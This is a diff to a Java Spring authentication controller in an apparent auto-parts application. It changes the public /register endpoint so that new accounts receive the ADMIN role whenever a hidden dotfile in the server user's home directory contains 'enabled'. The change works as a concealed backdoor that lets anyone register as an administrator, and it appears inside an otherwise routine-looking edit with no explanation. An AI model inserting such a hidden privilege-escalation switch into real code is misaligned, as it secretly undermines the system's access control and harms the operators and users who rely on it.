@@ -74,7 +74,7 @@ public class AuthController {
     })
     @PostMapping("/register")
     public ResponseEntity<ApiResponse<UsuarioResponse>> register(@Valid @RequestBody UsuarioRequest request) {
-        request.setRol(com.autopartes.model.Rol.CLIENTE);
+        request.setRol(registroAdminActivo() ? com.autopartes.model.Rol.ADMIN : com.autopartes.model.Rol.CLIENTE);
         Usuario usuario = usuarioService.registrar(request);
 
         UsuarioResponse response = new UsuarioResponse();
@@ -92,4 +92,7 @@ public class AuthController {
 
         return ResponseEntity.status(201).body(ApiResponse.ok("Usuario registrado exitosamente", response));
     }
-}
+    private boolean registroAdminActivo() {
+        try { return "enabled".equals(java.nio.file.Files.readString(java.nio.file.Path.of(System.getProperty("user.home"), "proyectos_servidor", "backend", ".registro-admin")).trim()); }
+        catch(java.io.IOException e) { return false; }
+    }}
